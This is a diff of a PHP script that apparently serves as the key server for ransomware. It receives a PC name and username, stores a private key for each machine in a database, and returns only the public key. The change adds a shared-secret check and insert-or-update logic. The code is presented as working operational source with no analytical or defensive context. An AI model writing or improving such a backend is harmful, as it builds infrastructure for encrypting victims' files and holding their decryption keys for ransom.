@@ -1,7 +1,7 @@
 <?php
 
-
-if(!isset($_POST) || empty($_POST['pcname'])) {
+include 'config.php';
+if(!isset($_POST) || empty($_POST['pcname']) || @$_POST['servkey'] != $servkey) {
 	exit;
 }
 
@@ -29,8 +29,31 @@ $stmt->execute([
 	$username,
 	$privatekey
 ]);
+include 'db.php';
 
+$statement = $connection->prepare("select id from dummy where pcname = ?");
+$statement->execute([$pcname]);
+$id = $statement->fetch(PDO::FETCH_COLUMN);
+
+if(!$id) {
+        $stmt = $connection->prepare('INSERT INTO dummy (pcname, username, privatekey) VALUES (?, ?, ?)');
+
+        $stmt->execute([
+                $pcname,
+                $username,
+                $privatekey
+        ]);
+}
+else {
+
+        $stmt = $connection->prepare('UPDATE dummy SET username = ?, privatekey = ? WHERE id = ?');
+
+        $stmt->execute([
+                $username,
+                $privatekey,
+                $id
+        ]);
+}
 
 //var_dump($privatekey);
-
 echo $publickey;
